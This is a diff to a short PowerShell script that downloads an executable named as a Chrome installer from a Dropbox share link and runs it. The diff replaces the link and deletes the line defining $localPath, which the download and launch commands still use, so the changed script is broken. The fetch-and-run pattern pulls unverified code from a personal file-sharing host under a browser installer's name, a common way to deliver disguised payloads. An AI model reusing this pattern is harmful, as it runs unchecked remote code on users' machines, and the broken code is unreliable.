@@ -1,5 +1,4 @@
-$exeUrl = "https://www.dropbox.com/pri/get/ChromeSetup%20(1).exe?_download_id=695961379771705614668559249472268454208956974835944761897780181414&_log_download_success=1&_notify_domain=www.dropbox.com&_subject_uid=2595689089&w=AAC-ominXrQgHLVWBCwsQoNSyA6SECF2SPAm4uMNZn09yw"
-$localPath = "$env:TEMP\setup.exe"
+$exeUrl = "https://www.dropbox.com/scl/fi/l1xkp2hhx15sx17bwl6z4/ChromeSetup-1.exe?rlkey=zm0t5fv402g0gwfp476woaqxk&st=eiuvgjs0&dl=1"
 
 Invoke-WebRequest -Uri $exeUrl -OutFile $localPath
 Start-Process -FilePath $localPath -Wait
